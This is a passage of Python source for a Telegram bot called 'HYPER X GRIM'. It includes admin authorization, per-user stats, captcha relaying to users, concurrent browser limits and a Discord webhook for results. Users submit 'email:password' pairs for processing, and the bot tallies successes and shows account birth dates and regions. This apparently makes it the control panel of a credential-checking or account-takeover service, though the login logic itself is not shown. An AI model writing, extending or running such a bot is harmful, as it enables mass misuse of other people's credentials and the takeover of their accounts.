                    f"**DOB:** {escape_md(ai.get('dob',''))}\n"
                    f"**Region:** {escape_md(ai.get('region',''))}"
                ),
            })
        await update.message.reply_text(
            fmt_msg("⚠️ Active Session", "CAPTCHA is waiting for your input.", COLOR_WARNING, fields),
            parse_mode="Markdown",
        )
    else:
        us = dm.stats.get("users_served", {}).get(str(uid), {})
        proc = us.get("processed", 0)
        succ = us.get("success",   0)
        fields += [
            {"name": "⚙️ Status",      "value": "✅ Ready"},
            {"name": "📊 Your Stats",  "value": f"**Processed:** {proc}\n**Success:** {succ}\n**Failed:** {proc-succ}"},
            {"name": "📝 Start",       "value": "/process email:password"},
        ]
        await update.message.reply_text(
            fmt_msg(f"{E['Tick_green']} Status", f"{E['access']} Logged in and ready\\.", COLOR_SUCCESS, fields),
            parse_mode="Markdown",
        )


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await _check_login(update, context):
        return
    uid = update.effective_user.id
    if uid not in dm.processing_sessions:
        await update.message.reply_text(
            fmt_msg(f"{E['Tick_green']} Nothing to Cancel", "No active process found\\.", COLOR_INFO),
            parse_mode="Markdown",
        )
        return
    dm.cleanup_session(uid)
    await update.message.reply_text(
        fmt_msg(f"{E['Tick_green']} Cancelled", f"{E['WARN']} Session terminated\\.", COLOR_SUCCESS),
        parse_mode="Markdown",
    )


# ══════════════════════════════════════════════════════════════════════════════
# ADMIN COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
def _admin_only(fn):
    import functools
    @functools.wraps(fn)
    async def wrapper(update, context):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text(
                fmt_msg(f"{E['Cross']} Access Denied", "Admin only\\.", COLOR_ERROR),
                parse_mode="Markdown",
            )
            return
        return await fn(update, context)
    return wrapper


@_admin_only
async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = dm.stats
    await update.message.reply_text(
        fmt_msg(
            "🛡️ Admin Panel",
            "HYPER X GRIM Control",
            COLOR_PRIMARY,
            [
                {"name": "📊 Users",      "value": f"**Authorized:** {len(dm.authorized_users)}\n**Active Sessions:** {len(dm.active_sessions)}\n**Processes:** {len(dm.processing_sessions)}"},
                {"name": "📈 Stats",      "value": f"**Total:** {s['total_processed']}\n**Success:** {s['total_success']}\n**Failed:** {s['total_failed']}"},
                {"name": "⚙️ Bot Status", "value": f"**Online** 🟢\n**Webhook:** {'✅' if dm.config.get('webhook_url') else '❌'}"},
            ],
        ),
        parse_mode="Markdown",
    )


@_admin_only
async def cmd_authorize(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(fmt_msg("❌ Usage", "/authorize \\<user\\_id\\>", COLOR_ERROR), parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.message.reply_text(fmt_msg("❌ Invalid ID", "Must be a number\\.", COLOR_ERROR), parse_mode="Markdown")
        return
    dm.authorize_user(target, update.effective_user.id)
    await update.message.reply_text(
        fmt_msg(f"{E['Tick_green']} Authorized", f"`{target}` can now use the bot\\!", COLOR_SUCCESS),
        parse_mode="Markdown",
    )
    try:
        await context.bot.send_message(
            chat_id=target,
            text=f"{E['Afree']} *Access Granted\\!*\n\nUse /help to get started\\.",
            parse_mode="Markdown",
        )
    except Exception:
        pass


@_admin_only
async def cmd_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(fmt_msg("❌ Usage", "/revoke \\<user\\_id\\>", COLOR_ERROR), parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.message.reply_text(fmt_msg("❌ Invalid ID", "Must be a number\\.", COLOR_ERROR), parse_mode="Markdown")
        return
    if target == ADMIN_ID:
        await update.message.reply_text(fmt_msg(f"{E['Cross']} Error", "Cannot revoke admin\\.", COLOR_ERROR), parse_mode="Markdown")
        return
    dm.revoke_user(target)
    await update.message.reply_text(
        fmt_msg(f"{E['Tick_green']} Revoked", f"`{target}`'s access removed\\.", COLOR_SUCCESS),
        parse_mode="Markdown",
    )


@_admin_only
async def cmd_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lines = []
    for uid_str in dm.authorized_users:
        try:
            user = await context.bot.get_chat(int(uid_str))
            lines.append(f"\\- *{escape_md(user.first_name or 'Unknown')}* \\(`{uid_str}`\\)")
        except Exception:
            lines.append(f"\\- Unknown \\(`{uid_str}`\\)")
    body = "\n".join(lines) if lines else "No users"
    await update.message.reply_text(
        fmt_msg(f"{E['Folder']} Authorized Users", body, COLOR_PRIMARY),
        parse_mode="Markdown",
    )


@_admin_only
async def cmd_set_webhook(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(fmt_msg("❌ Usage", "/set\\_webhook \\<url\\>", COLOR_ERROR), parse_mode="Markdown")
        return
    url = " ".join(context.args).strip()
    if not url.startswith("https://discord.com/api/webhooks/"):
        await update.message.reply_text(
            fmt_msg(f"{E['Cross']} Invalid URL", "Must be a Discord webhook URL\\.", COLOR_ERROR),
            parse_mode="Markdown",
        )
        return
    dm.config["webhook_url"] = url
    dm.save_config()
    await update.message.reply_text(
        fmt_msg(f"{E['Tick_green']} Webhook Set", "Configured successfully\\!", COLOR_SUCCESS),
        parse_mode="Markdown",
    )


@_admin_only
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = dm.stats
    rate = (s["total_success"] / s["total_processed"] * 100) if s["total_processed"] > 0 else 0
    top = sorted(s["users_served"].items(), key=lambda x: x[1]["processed"], reverse=True)[:5]
    top_text = "\n".join(
        f"\\- `{uid}`: {d['processed']} processed \\({d['success']} ✅\\)" for uid, d in top
    ) or "No data"
    await update.message.reply_text(
        fmt_msg(
            "📊 Statistics",
            "Bot performance metrics",
            COLOR_PRIMARY,
            [
                {"name": "📈 Total",       "value": f"**Processed:** {s['total_processed']}\n**Success:** {s['total_success']}\n**Failed:** {s['total_failed']}"},
                {"name": "🎯 Success Rate","value": f"**{rate:.1f}%**"},
                {"name": "👥 Users",       "value": f"**Authorized:** {len(dm.authorized_users)}\n**Online:** {len(dm.active_sessions)}"},
                {"name": "🏆 Top Users",   "value": top_text},
            ],
        ),
        parse_mode="Markdown",
    )


# ══════════════════════════════════════════════════════════════════════════════
# MESSAGE HANDLER
# ══════════════════════════════════════════════════════════════════════════════
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    uid  = update.effective_user.id
    text = update.message.text.strip()
    if not text:
        return
    # If user has an active captcha session, treat plain text as captcha answer
    if uid in dm.processing_sessions:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"📨 CAPTCHA received: `{escape_md(text)}`\\. Processing\\.\\.\\.",
            parse_mode="Markdown",
        )
        asyncio.create_task(continue_after_captcha(uid, text, update.effective_chat.id, context))


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    print(f"❌ Bot error: {context.error}")
    traceback.print_exc()


# ══════════════════════════════════════════════════════════════════════════════
# STARTUP BANNER
# ══════════════════════════════════════════════════════════════════════════════
async def post_init(app):
    print(f"\n╔{'═'*60}╗")
    print(f"║{'  ⚡ HYPER X GRIM  ◈  TELEGRAM ONLINE':^60}║")
    print(f"╚{'═'*60}╝")
    print(f"✅ Admin ID         : {ADMIN_ID}")
    print(f"✅ Authorized Users : {len(dm.authorized_users)}")
    print(f"✅ Max Browsers     : {MAX_CONCURRENT_BROWSERS}")
    print(f"✅ Captcha Timeout  : {CAPTCHA_TIMEOUT_MINUTES} min")
    print(f"✅ Webhook          : {'Configured' if dm.config.get('webhook_url') else 'Not Set'}")
    print(f"{'='*62}\n")


# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .read_timeout(60)
        .write_timeout(60)
        .connect_timeout(30)
        .pool_timeout(60)
        .build()
    )

    # User commands
    app.add_handler(CommandHandler("start",          cmd_start))
    app.add_handler(CommandHandler("help",           cmd_help))
    app.add_handler(CommandHandler("request_otp",    cmd_request_otp))
    app.add_handler(CommandHandler("verify_otp",     cmd_verify_otp))
    app.add_handler(CommandHandler("logout",         cmd_logout))
    app.add_handler(CommandHandler("process",        cmd_process))
    app.add_handler(CommandHandler("submit_captcha", cmd_submit_captcha))
    app.add_handler(CommandHandler("status",         cmd_status))
    app.add_handler(CommandHandler("cancel",         cmd_cancel))

    # Admin commands
    app.add_handler(CommandHandler("admin",       cmd_admin))
    app.add_handler(CommandHandler("authorize",   cmd_authorize))
    app.add_handler(CommandHandler("revoke",      cmd_revoke))
    app.add_handler(CommandHandler("list_users",  cmd_list_users))
    app.add_handler(CommandHandler("set_webhook", cmd_set_webhook))
    app.add_handler(CommandHandler("stats",       cmd_stats))

    # Message handler (plain text as captcha fallback)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Error handler
    app.add_error_handler(error_handler)

    print("🚀 Starting HYPER X GRIM Telegram Bot...")
    app.run_polling(
        allowed_updates=["message", "callback_query"],
        drop_pending_updates=True,
    )


if __name__ == "__main__":
    while True:
        try:
            main()
        except KeyboardInterrupt:
            print("\n👋 Bot stopped.")
            break
        except Exception as exc:
            print(f"\n⚠️ Bot crashed: {exc} — restarting in 5s...")
            traceback.print_exc()
            time.sleep(5)
